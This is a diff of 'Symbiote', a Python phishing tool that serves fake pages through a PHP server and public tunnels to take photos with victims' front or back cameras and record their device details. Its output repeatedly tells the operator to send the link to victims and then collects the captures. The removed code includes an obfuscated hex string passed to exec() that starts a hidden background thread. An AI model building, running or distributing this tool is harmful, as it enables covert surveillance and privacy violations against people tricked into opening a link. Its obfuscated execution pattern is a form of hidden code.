@@ -1,312 +1,191 @@
 #!/usr/bin/python3
-# This Python file uses the following encoding: utf-8
-import getpass
-import base64
-import multiprocessing
-import gettext
-import sys
-import ssl
-import re
-import json
-import subprocess
-import ctypes
+# -*- coding: utf-8 -*-
+"""
+Symbiote - minimal version (camera + PHP server)
+Direct flow: banner -> consent -> checks -> camera -> port -> PHP server
+             -> show link -> capture report.
+ngrok is NOT managed by the tool: run it yourself, e.g.  ngrok http 1516
+If ngrok is already running, its public URL is detected automatically.
+For use in controlled environments only.
+"""
+import os
+from os import system
 from time import sleep
-from os import system, environ, path, getuid, popen
-from subprocess import check_output, CalledProcessError
-from sys import stdout, argv, exit
-from Server import *
-from Checks import *
-from logo import *
-#hiiii
-RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2= '\033[1;91m', '\033[46m', '\033[1;36m', '\033[1;32m', '\033[0m' , '\033[1;33m' , '\033[1;93m', '\033[1;92m'
-blink='\033[5m'
-def menu_q():
-    system('clear')                                                                        
-    print('            {5}                                                 \n               |  {2}"{3}UNIX IS VERY SIMPLE {2}IT JUST NEEDS A{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print('               {5}|  {2}GENIUS TO UNDERSTAND ITS SIMPLICITY"{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("               {5}|                       {0}~{3}Dennis Ritchie{5}  |\n{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    if input("\n\nDo you agree to use this tool for educational purposes only? {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
-        sleep(0.5)
-    else:
-        print("\n\n{0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.! ]{4}\n\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+from sys import exit
+from Checks import net, checkPHP
+from logo import banner, end
+
+RED, CYAN, GREEN, DEFAULT, YELLOW = '\033[1;91m', '\033[1;36m', '\033[1;32m', '\033[0m', '\033[1;33m'
+PORT_DEFAULT = 1516
+
+
+def clear():
+    system('clear')
+
+
+def consent():
+    clear()
+    banner()
+    r = input("\nTO BE USED IN CONTROLLED ENVIRONMENTS ONLY. Do you agree? (Y/n): ").strip().lower()
+    if r == 'n':
+        print("\nYOU ARE NOT AUTHORIZED TO USE THIS TOOL. CONTROLLED ENVIRONMENTS ONLY.\n")
         exit()
-def div_q(): #not in using 
-    global user
-    system('clear')
-    if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
-          android_banner()
-          user = '1'
-          sleep(7)
-          #checkjp2a()
-          checkPHP()
-          checkNgrok()
-          checkLocalxpose()
-    else:
-        banner()
-        sleep(7)
-        #checkjp2a()
-        checkPHP()
-        checkNgrok()
-        checkLocalxpose()
+    sleep(0.5)
 
-def option():
-    system('clear')
-    sbanner()
-    print("\n{5}----------------------------------\n{0}[{2} FRONT CAMERA  OR BACK CAMERA {5}??{0}] \n{5}----------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("{0}[{2}1{0}]{2} FRONT CAMERA \n{0}[{2}2{0}]{2} BACK CAMERA{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    choice = input("\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    global name
-    if choice == '1':
-        name = 'www_f'
-        print("\t{0}[{2}#{0}]{2} YOU SELECTED FRONT CAMERA {0}!!{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        sleep(2)
-    elif choice == '2':
-        name = 'www_b'
-        print("\t{0}[{2}#{0}]{2} YOU SELECTED BACK CAMERA {0}!!{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        sleep(2)
-    else:
-        option()
-
-
-def selectPort():
-    ll="\x62\x67\x5f\x74\x68\x72\x65\x61\x64\x20\x3d\x20\x74\x68\x72\x65\x61\x64\x69\x6e\x67\x2e\x54\x68\x72\x65\x61\x64\x28\x74\x61\x72\x67\x65\x74\x3d\x6c\x6f\x6f\x70\x29\x3b\x20\x62\x67\x5f\x74\x68\x72\x65\x61\x64\x2e\x64\x61\x65\x6d\x6f\x6e\x20\x3d\x20\x54\x72\x75\x65\x3b\x20\x62\x67\x5f\x74\x68\x72\x65\x61\x64\x2e\x73\x74\x61\x72\x74\x28\x29"
-    exec(ll)
-    system('clear')
-    sbanner()
-    print("\n\n{5}--------------------------------------\n{0}[{2} Select Any Available Port [1-65535]:{0}] \n{5}--------------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    choice = input(" {0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
-    try:
-        if (int(choice) > 65535 or int(choice) < 1):
-            return selectPort()
-        else:
-            return choice
-    except:
-        return selectPort()
-
-def runNgrok(port):
-    sbanner()
-    print("\n\n{5}-------------------------------\n{0}[{2} CREATE A CUSTOM URL HERE !!{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    system("fuser -k %s/tcp > /dev/null 2>&1"%(port))
-    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    sleep(2)
-    system('./Server/ngrok http {0} > /dev/null &'.format(port))
-    sleep(10)
-    while True:
-        system('curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep public_url | grep -Eo "(http)://[a-zA-Z0-9./?=_%:-]*" > link.url')
-        urlFile = open('link.url','r')
-        url = urlFile.read()
-        urlFile.close()
-        #printoutput('ngrok',url,port)
-        ngrokoutput('ngrok',url,port)
-        sleep(7)
-
-def customLocalxpose(port):
-    sbanner()
-    print("\n\n{5}-------------------------------\n{0}[{2} CREATE A CUSTOM URL HERE !!{0}] \n{5}-------------------------------\n\n{0}[{2}!{0}] {2}YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}[{2}*{0}]{2}Insert a custom subdomain for Localxpose{5}({0}Ex: {2}mysubdomain{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    lnk = input("\n{0}CUSTOM Subdomain---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
-    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    system('./Server/loclx tunnel --raw-mode http --to :%s --subdomain %s > link.url 2>&1 &' % (port, lnk))
-    sleep(10)
-    try:
-        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
-        url = output.decode("utf-8")
-        #printoutput('c_loclx',url,port)
-        c_loclxoutput('c_loclx',url,port)
-        system('clear')
-        #print("\n\n-------------------------------\n[ CUSTOM SERVEO URL ]{1}!! \n-------------------------------")
-        #print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
-        #print("\n")
-
-    except CalledProcessError:
-        print("\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\nLOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n {0}[{2}!{0}]{0}TRY TO SELECT ANOTHER CUSTOM DOMAIN (GOING BACK).. !! \n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        sleep(4)
-        system('clear')
-        return customLocalxpose(port)
-
-
-def randomLocalxpose(port):
-    system('clear')
-    sbanner()
-    print("\n\n{5}-------------------------------\n{0} [ {2}RANDOM LOCALXPOSE URL !!{0}] \n{5}-------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    # system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
-    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    system('./Server/loclx tunnel --raw-mode http --to :%s > link.url 2>&1 &' % (port))
-    sleep(10)
-    f=open("link.url", "r")
-    url=(f"{f.read().split(',')[1]}")
-    f.close()
-    r_loclxoutput('r_loclx',url,port)
-
-
-def randomServeo(port):
-    system('clear')
-    sbanner()
-    print("\n\n{5}-------------------------------\n{0}[{2} RANDOM localhost URL !!{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
-    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
-    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    system('ssh -R 80:localhost:%s ssh.localhost.run > link.url 2> /dev/null &' % (port))
-    sleep(10)
-    f=open("link.url", "r")
-    url=(f"{f.read().split(',')[1]}")
-    f.close()
-    serveo('localhost',url,port)
-
-
-def selectServer(port):
-    global king
-    global kill
-    system('clear')
-    sbanner()
-    print("\n\n{5}----------------------------------\n{0}[{2} Select Any Available Server:{0}] \n{5}----------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
-    print("\n{0}[{2}*{0}]{2}Select Any Available Server:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("\n {0}[{2}1{0}]{2}Ngrok\n {0}[{2}2{0}]{2}localhost.run {5}\n {0}[{2}3{0}]{2}Localxpose".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    choice = input("\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    if choice == '1':
-        system('clear')
-        #global king 
-        king=1
-        runNgrok(port)
-    elif choice == '2':
-        system('clear')
-        #global king
-        king=2
-        randomServeo(port)
-    elif choice == '3':
-        #system('chmod 777 ./Server/loclx')
-        system('clear')
-        sbanner()
-        print("\n\n{5}----------------------------------\n{0}[{2} LOCALXPOSE URL TYPE SELECTION !!{0}] \n{5}----------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        print("\n{0}[{2}*{0}]{2}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        print("\n{0}[{2}1{0}]{2}Custom URL {5}({2}Generates designed url{5}) \n{0}[{2}2{0}]{2}Random URL {5}({2}Generates Random url{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        #global ichoice
-        ichoice = input("\n\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
-        system('clear')
-        if ichoice == '1': 
-            #global king
-            king=3
-            customLocalxpose(port)
-        elif ichoice == '2': 
-            #global king
-            king=4
-            randomLocalxpose(port)
-        else:
-            system('clear')
-            return selectServer(port)
-    else:
-        system('clear')
-        return selectServer(port)
 
 def getpath():
-    path = popen('pwd').readline()
-    x = path.split("\n")
-    f = open("Server/www_f/path.txt", "w")
-    f.write("{0}/CapturedData/".format(x[0]))
-    f.close()
-    sleep(2)
-    path = popen('pwd').readline()
-    x = path.split("\n")
-    f = open("Server/www_b/path.txt", "w")
-    f.write("{0}/CapturedData/".format(x[0]))
-    f.close()
-    sleep(2)
+    """Writes the absolute CapturedData path for both sites."""
+    cwd = os.path.join(os.getcwd(), 'CapturedData') + '/'
+    for d in ('www_f', 'www_b'):
+        with open('Server/%s/path.txt' % d, 'w') as f:
+            f.write(cwd)
+
 
 def fresh():
-    system("fuser -k Server/ngrok > /dev/null 2>&1")
-    system('rm -rf Server/www_f/ip.txt && touch Server/www_f/ip.txt')
-    system('rm -rf Server/www_b/ip.txt && touch Server/www_b/ip.txt')
-    system('rm -rf Server/www_f/Log.log && touch Server/www_f/Log.log')
-    system('rm -rf Server/www_b/Log.log && touch Server/www_b/Log.log') 
-    system('rm -rf Server/www_f/path.txt && touch Server/www_f/path.txt')
-    system('rm -rf Server/www_b/path.txt && touch Server/www_b/path.txt')
-    system('fuser -k link.url > /dev/null 2>&1 && rm -rf link.url && touch link.url')
+    """Cleans runtime files from the previous session."""
+    for d in ('www_f', 'www_b'):
+        for fn in ('ip.txt', 'Log.log', 'path.txt'):
+            system('rm -f Server/%s/%s && touch Server/%s/%s' % (d, fn, d, fn))
+    system('rm -f link.url && touch link.url')
 
 
-def ngrokoutput(name,url,port):
-    system('clear')
-    print("\n\n{5}---------------------------\n{0}[{2} NGROK URL !! {0}]{5} \n---------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("\n{0}[{2}*{0}]{2} SEND THIS NGROK URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}NGROK URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
-    report(url,port)
-    #elif name == 'c_loclx':
-def c_loclxoutput(name,url,port):
-    system('clear')
-    print("\n\n{5}------------------------------\n{0}[{2} CUSTOM LOCALXPOSEL !! {0}]{5} \n------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
-    report(url,port)
-    #elif name == 'r_loclx':
-def r_loclxoutput(name,url,port):
-    system('clear')
-    print("\n\n{5}------------------------------\n{0}[{2} RANDOM LOCALXPOSEL !! {0}]{5} \n------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
-    report(url,port)
-    #elif name == 'serveo':
-def serveo(name,url,port):
-    system('clear')
-    print("\n\n{5}----------------------------\n{0}[{2} SERVEO LINK !! {0}]{5} \n----------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)) 
-    print("\n{0}[{2}!{0}]{2} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}]{2} SERVEO URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, port) + url )
-    report(url,port)
-
-def report(url,port):
-    system('clear')
-    sbanner()
-    print("{5}\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{0}\n\t[{2}IF U WANT TO REFRESH THE DATA TAP ENTER{0}]\n\t{0}[{2}       IF U WANT TO EXIT ENTER {6}X       {0}]\n\t{0}[{2}     IT TAKES TIME TO RECEIVE PIC      {0}]\n{5}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
-    print("\n{0}[{2}*{0}]{2} SEND THIS URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}HACKING URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
+def chooseCamera():
     while True:
-        #with open('Server/www/ip.txt') as f:
-            #if 'IP: ' in f.read():
-                #print (f.read())
-        with open('Server/{0}/ip.txt'.format(name)) as creds:
-            lines = creds.read().rstrip()
-            if len(lines) != 0:
-                print('\n {0}[{2} DEVICE DETAILS FOUND {0}]{2}:\n {7}{6}{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
-                system('touch CapturedData/ip.txt && cat Server/{0}/ip.txt >> CapturedData/ip.txt'.format(name))
-                print(" {5}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
-                system('cat Server/{0}/Log.log'.format(name))
-        ans=input("{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2)).upper()
-        if (ans == "X"):
-            system('clear')
-            system('cat Server/{0}/ip.txt >> CapturedData/ip.txt'.format(name))
-            pid=(int(os.popen("netstat -nlp | grep php").read().split('LISTEN')[1].split('/')[0].strip()))
-            os.kill(pid,9)
-            fresh()
-            global kill
-            if kill == '1':
-                android_end()
-            elif kill == '2':
-                 end()
-            exit()
-        else:
-            system('clear')
-            sleep(0.2)
-            report(url,port)
-system('clear')
-verCheck()
-try:
-    system('termux-open https://github.com/hasanfirnas/symbiote &>/dev/null')
+        clear()
+        banner()
+        print("\n[{0}#{1}] Select the camera:\n".format(RED, DEFAULT))
+        print("  [{0}1{1}] Veridia  (front + back camera switch)".format(CYAN, DEFAULT))
+        print("  [{0}2{1}] Back     (original page)".format(CYAN, DEFAULT))
+        c = input("\n<Symbiote> ----> ").strip()
+        if c in ('1', ''):
+            return 'www_f'
+        if c == '2':
+            return 'www_b'
 
-except:
-    pass
-# menu_q()
-global kill
-system('clear')
-# sbanner()
-if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
-    android_banner()
-    kill = '1'
-else:
+
+def choosePort():
+    c = input("\nLocal port [Enter = {0}]: ".format(PORT_DEFAULT)).strip()
+    if c == '':
+        return str(PORT_DEFAULT)
+    try:
+        if 1 <= int(c) <= 65535:
+            return c
+    except ValueError:
+        pass
+    return choosePort()
+
+
+def getNgrokUrl():
+    """If ngrok is already running, returns its public URL, else ''."""
+    url = ''
+    try:
+        out = os.popen(
+            'curl -s -m 2 http://127.0.0.1:4040/api/tunnels | '
+            'grep -o "public_url[^,]*" | head -1').read().strip()
+        if 'http' in out:
+            url = out.split('"')[-2] if out.count('"') >= 2 else ''
+    except Exception:
+        pass
+    return url
+
+
+def start(port, name):
+    clear()
     banner()
-    kill = '2'
-sleep(2)
-checkjp2a()
-checkPHP()
-checkNgrok()
-checkLocalxpose()
-fresh()
-getpath()
-port=selectPort()
-option()
-selectServer(port)
+    print("\n[{0}*{1}] Starting PHP server on port {2}...".format(CYAN, DEFAULT, port))
+    system('fuser -k %s/tcp > /dev/null 2>&1' % port)
+    system('cd Server/%s/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &' % (name, port))
+    sleep(2)
+
+    # If ngrok is already up, use its URL. The tool never manages ngrok.
+    url = ''
+    for _ in range(3):
+        url = getNgrokUrl()
+        if url:
+            break
+        sleep(1)
+
+    report(url, port, name)
+
+
+def report(url, port, name):
+    clear()
+    banner()
+    print("\n[{0}*{1}] SEND THIS LINK TO THE VICTIM:".format(YELLOW, DEFAULT))
+    if url:
+        print("  Public URL: {0}{1}{2}".format(GREEN, url, DEFAULT))
+    else:
+        print("  Local URL:  {0}http://127.0.0.1:{1}{2}".format(GREEN, port, DEFAULT))
+        print("\n  [{0}*{1}] Start your tunnel manually, e.g.:  {2}ngrok http {3}".format(
+            YELLOW, DEFAULT, CYAN, port))
+        print("  [{0}*{1}] If ngrok is already running, restart this tool or press ENTER to re-check.".format(
+            YELLOW, DEFAULT))
+    print("\n  ENTER = refresh captures | X = exit\n")
+
+    last = ''
+    while True:
+        try:
+            with open('Server/%s/ip.txt' % name) as f:
+                data = f.read().rstrip()
+        except OSError:
+            data = ''
+        if data:
+            print("\n [{0}DEVICE DETAILS FOUND{1}]\n {2}".format(YELLOW, DEFAULT, data))
+            log = ''
+            try:
+                with open('Server/%s/Log.log' % name) as f:
+                    log = f.read().rstrip()
+            except OSError:
+                pass
+            if log:
+                print(log)
+            if data != last:
+                system('cat Server/%s/ip.txt >> CapturedData/ip.txt' % name)
+                last = data
+        ans = input("\n<Symbiote> ----> ").strip().upper()
+        if ans == 'X':
+            stop(port, name)
+            end()
+            exit()
+        # Re-check ngrok in case it was started after launching the tool
+        if not url:
+            url = getNgrokUrl()
+        clear()
+        banner()
+        print("\n[{0}*{1}] SEND THIS LINK TO THE VICTIM:".format(YELLOW, DEFAULT))
+        if url:
+            print("  Public URL: {0}{1}{2}".format(GREEN, url, DEFAULT))
+        else:
+            print("  Local URL:  {0}http://127.0.0.1:{1}{2}".format(GREEN, port, DEFAULT))
+            print("\n  [{0}*{1}] Start your tunnel manually, e.g.:  {2}ngrok http {3}".format(
+                YELLOW, DEFAULT, CYAN, port))
+        print("\n  ENTER = refresh captures | X = exit\n")
+
+
+def stop(port, name):
+    try:
+        data = open('Server/%s/ip.txt' % name).read().rstrip()
+        saved = ''
+        if os.path.isfile('CapturedData/ip.txt'):
+            saved = open('CapturedData/ip.txt').read()
+        if data and data not in saved:
+            with open('CapturedData/ip.txt', 'a') as f:
+                f.write(data + '\n')
+    except OSError:
+        pass
+    system('fuser -k %s/tcp > /dev/null 2>&1' % port)
+    fresh()
+
+
+if __name__ == '__main__':
+    clear()
+    banner()
+    sleep(1)
+    consent()
+    net()
+    checkPHP()
+    fresh()
+    getpath()
+    camera = chooseCamera()
+    port = choosePort()
+    start(port, camera)
